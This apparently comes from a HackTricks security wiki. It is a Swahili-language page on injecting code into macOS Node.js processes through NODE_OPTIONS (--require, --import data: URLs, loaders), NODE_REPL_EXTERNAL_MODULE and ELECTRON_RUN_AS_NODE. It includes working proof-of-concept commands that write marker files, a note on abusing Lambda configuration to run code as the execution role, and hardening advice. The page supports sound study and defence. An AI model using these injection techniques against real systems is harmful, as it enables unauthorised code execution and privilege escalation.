# macOS Node.js Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Ikiwa mshambuliaji anaweza kudhibiti mazingira ya process ambayo hatimaye inaanzisha **Node.js** (binary ya `node` moja kwa moja, au CLI yoyote inayotegemea Node kama vile `npm`, `npx`, `yarn`, `pnpm`, `eslint`, `tsc`, `next`, …), environment variables kadhaa hufanya runtime **ipakie na itekeleze JavaScript inayodhibitiwa na mshambuliaji kabla ya program inayolengwa kuanza**. Hii ni code-execution primitive inayolingana na familia za `PERL5OPT`/`RUBYOPT`/`_JAVA_OPTIONS` kwa runtimes nyingine.

Code iliyopakiwa awali huendeshwa katika **process ileile** ikiwa na uid, environment, file descriptors na entitlements zilezile za victim, hivyo hii ni injection/priv-esc vector safi kila wakati process yenye privileges zaidi inapoanzisha Node ikiwa na environment iliyorithiwa au iliyoathiriwa na mshambuliaji.

## `NODE_OPTIONS` — `--require` (file-backed)

`NODE_OPTIONS` huchanganuliwa kana kwamba maudhui yake ni command-line flags za ziada. `--require` (`-r`) hupakia mapema CommonJS module **kabla ya entry point**, hivyo code yake ya kiwango cha juu huendeshwa kwanza.<sup>[[1]](#references)</sup>
```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```
## `NODE_OPTIONS` — `--import` with a `data:` URL (bila faili)

Tangu **Node 20.6**, `--import` inakubali URL ya `data:text/javascript,<code>`, hivyo kukuruhusu kupakia mapema ES-module JavaScript **inline, bila faili kwenye disk wala module directory**. Code lazima iwe **imefanyiwa URL-encoding kikamilifu** (nafasi tupu au `#` isiyofanyiwa encoding hukata data URL na kusababisha `SyntaxError`).<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```
Hii ndiyo technique inayotumiwa vibaya kwenye cloud, kwa mfano kuingiza `NODE_OPTIONS` kwenye configuration ya AWS Lambda function (`lambda:UpdateFunctionConfiguration`, hakuna `iam:PassRole` inayohitajika) ili kuendesha code kama execution role.

> [!TIP]
> `NODE_OPTIONS` **haiwezi kuendesha code moja kwa moja**: flags kama `--eval`/`-e`, `-p`, au script path zinakataliwa waziwazi (`node: --eval is not allowed in NODE_OPTIONS`). Tumia `--require`/`--import` kuelekeza kwenye code badala yake.

## `NODE_OPTIONS` — custom loaders / startup flags nyingine

`NODE_OPTIONS` pia inaheshimu startup flags nyingine zinazoathiri startup ambazo side effect yake ni kuendesha attacker code, kwa mfano ESM loader hook:
```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```
Launcher yoyote yenye msingi wa Node inayozindua `node` child kwa kawaida **husambaza `NODE_OPTIONS`**, hivyo kuiingiza mara moja kunaweza kuathiri toolchain nzima (`npm run …`, `npx`, build tools, test runners, language servers).

## `NODE_REPL_EXTERNAL_MODULE`

Node inapoanzisha **interactive REPL**, hupakia module iliyoainishwa na `NODE_REPL_EXTERNAL_MODULE`, na kutekeleza top-level code yake. Hii ni muhimu wakati mwathiriwa anapoanzisha interactive `node`/`node -i` shell (dev tooling, maintenance consoles).<sup>[[3]](#references)</sup>
```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```
> [!WARNING]
> `NODE_REPL_EXTERNAL_MODULE` hupuuzwa kimakusudi wakati ulinzi wa [`kDisableNodeOptionsEnv`](https://nodejs.org/api/cli.html) unatumiwa kuanzisha child, lakini REPL ya interactive iliyoanzishwa moja kwa moja huiheshimu.

## Electron (`ELECTRON_RUN_AS_NODE`)

Applications za Electron huonyesha tena Node runtime kamili zinapoanzishwa kwa **`ELECTRON_RUN_AS_NODE=1`**, wakati huo vectors zote za `NODE_OPTIONS` zilizo hapo juu hutumika kwenye Electron binary (ambayo mara nyingi huwa signed/entitled). Tazama:

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## Runtimes nyingine za JS

- **Bun** husoma `NODE_OPTIONS` kwa ajili ya compatibility na inasaidia `--preload` yake yenyewe (inayoweza kusanidiwa kupitia `bunfig.toml`).
- **Deno** haiheshimu `NODE_OPTIONS`; inahitaji flags za moja kwa moja (`--import`, `--preload`) badala yake, kwa hiyo haiathiriwi na `NODE_OPTIONS` iliyorithiwa.

Thibitisha kila mara runtime na version halisi, kwa kuwa flags zinazokubalika hubadilika kati ya releases.

## Kuimarisha usalama

- Ondoa `NODE_OPTIONS`, `NODE_REPL_EXTERNAL_MODULE` na `ELECTRON_RUN_AS_NODE` kwenye environment kabla ya kuanzisha Node kutoka context yenye privileges zaidi; anzisha children kwa environment iliyosafishwa.
- Chukulia uwezo wa kuweka environment ya target (config injection, `launchd`/`launchctl setenv`, plist/`EnvironmentVariables`, CI variables, Lambda/container config) kuwa sawa na code execution katika Node process yoyote inayoianzisha.
- Fuatilia process exec kwa variables hizi kwa njia ileile ambayo [Shield](https://github.com/theevilbit/Shield) hutoa alerts kuhusu `ELECTRON_RUN_AS_NODE` na dyld injection variables.

## References

- [1] [Hati za Node.js CLI — `NODE_OPTIONS`, `--require`, `--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` na `data:` URLs](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
